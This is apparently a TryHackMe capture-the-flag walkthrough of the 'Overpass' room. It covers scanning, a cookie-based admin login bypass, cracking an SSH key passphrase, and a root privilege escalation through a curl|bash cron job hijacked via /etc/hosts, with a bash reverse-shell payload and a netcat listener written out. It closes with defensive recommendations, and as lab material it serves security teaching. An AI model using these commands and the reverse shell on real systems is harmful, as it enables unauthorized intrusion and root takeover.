Walkthrough: TryHackMe – Overpass
=================================
What happens when computer science students attempt to build a secure password manager? In this walkthrough of the Overpass room on TryHackMe, we explore how client-side authentication flaws, weak cryptographic key passphrase management, and insecure cron jobs can lead to full system compromise.

1 Network Reconnaissance
-------------------------
Every security assessment begins with mapping out the target’s exposed network surface. We execute an Nmap service scan to identify open ports, active services, and operating system details.
```
nmap -sS -sC -sV -Pn -p22,80 TARGET_IP
```
- Output
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-04 05:23 UTC
Nmap scan report for ip-10-128-137-224.eu-west-3.compute.internal (10.128.137.224)
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0b:e5:54:20:26:cd:64:36:ca:9b:9f:25:f2:f4:a7:bd (RSA)
|   256 10:a4:6b:21:a5:7f:54:a3:07:d3:bc:87:f1:0c:07:b9 (ECDSA)
|_  256 a7:9b:3e:68:20:b3:6c:8e:24:f3:92:49:70:75:f7:ad (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```
2 Web Enumeration
------------------
Navigating to http://TARGET_IP/ presents a typical homepage advertising the Overpass password manager.

<img width="934" height="359" alt="overpass_0_home" src="https://github.com/user-attachments/assets/e568187d-9c57-49e7-8973-f09ad01847f3" />

- To uncover hidden endpoints and JavaScript files, we perform directory brute-forcing using Gobuster.
```
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -z -x .txt,.html,.json,.js,.bak,.log,.config
```
- Enumeration Output
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                 http://10.128.137.224/
[+] Method:              GET
[+] Threads:             10
[+] Wordlist:            /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:          gobuster/3.6
[+] Extensions:          bak,log,config,txt,html,php,json,js
[+] Timeout:             10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/404.html             (Status: 200) [Size: 782]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/cookie.js            (Status: 200) [Size: 1502]
/css                  (Status: 301) [Size: 0] [--> css/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/index.html           (Status: 301) [Size: 0] [--> ./]
/login.js             (Status: 200) [Size: 1779]
/main.js              (Status: 200) [Size: 28]
===============================================================
Finished
===============================================================
```
- The scan reveals a login portal at /admin and client-side scripts including /login.js and /cookie.js.

3 Exploiting Broken Authentication
-----------------------------------
Attempting default credentials on the /admin page fails. However, inspecting /login.js reveals a critical flaw in how authentication state is managed.

<img width="946" height="357" alt="overpass_0_admin_login" src="https://github.com/user-attachments/assets/2057b255-c224-4621-8cf2-5547acd896d4" />

The client-side script verifies credentials via an API request. Upon receiving a response, it sets a SessionToken cookie on the client side without validating server-side tokens or enforcing cryptographic signatures.

<img width="433" height="187" alt="overpass_0_auth_bypass" src="https://github.com/user-attachments/assets/53e62cd2-4bb3-4fab-bdb6-1067363e7cf9" />

Authentication Bypass
- We can bypass the login mechanism entirely by manually injecting a SessionToken cookie into our HTTP request:
```
curl -i -s http://10.128.137.224/admin/ -b "SessionToken=any"
```
- Accessing the admin dashboard reveals an encrypted SSH private key belonging to user james.
<img width="940" height="314" alt="overpass_0_rsa_key" src="https://github.com/user-attachments/assets/aba4532c-a2de-4d9b-b161-58a08b2665f3" />

Cracking the SSH Key Passphrase
- Because the RSA private key is protected by a passphrase, we use ssh2john to format the key for offline cracking, followed by John the Ripper with the rockyou.txt wordlist:
```
ssh2john rsa_id > rsa_pass.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_pass.txt
```
- Once John uncovers the passphrase, we establish an SSH session as user james:
```
ssh -i rsa_id james@TARGET_IP
```

4 Privilege Escalation
-----------------------
Now logged in as james, we audit local automated tasks and environment settings to find a path to root.

- Inspecting the system crontab reveals a periodic root task:
```
cat /etc/crontab
```
- Crontab Entry:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
- Every minute, root executes curl to fetch a script from domain overpass.thm and pipes it straight into bash.

- Next, we check host resolution settings in /etc/hosts:
```
cat /etc/hosts
```
- Snippet
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
ATTCKER_IP overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
- Because user james has write permissions to /etc/hosts (or write access was acquired), we modify the entry so that overpass.thm resolves to our Attacker IP instead of the local address.

Hijacking the Cron Job
- On the attacker machine, we mimic the expected path structure and host a malicious payload:
- Create the directory structure:
```
mkdir -p downloads/src
```
- Generate the payload script:
```
echo "/bin/bash -i >& /dev/tcp/10.0.3.15/8000 0>&1" > downloads/src/buildscript.sh
chmod +x downloads/src/buildscript.sh
```
- Start a local HTTP server on port 80:
```
python3 -m http.server 80
```
- Start a netcat listener on port 8000:
```
nc -lvnp 8000
```
- Within one minute, the system's root cron job resolves overpass.thm to our machine, fetches buildscript.sh, executes it, and delivers a root shell.

Recommendatations
-----------------
- Enforce server-side authentication validation using cryptographically signed, HTTP-only session tokens rather than trusting client-side JavaScript logic.
- Protect SSH private keys with high-entropy passphrases and store them outside public web directories to prevent unauthorized exposure and offline cracking.
- Restructure privilege escalation paths by eliminating curl | bash cron jobs, using static binaries with full paths, and locking /etc/hosts permissions to 644 under root ownership.

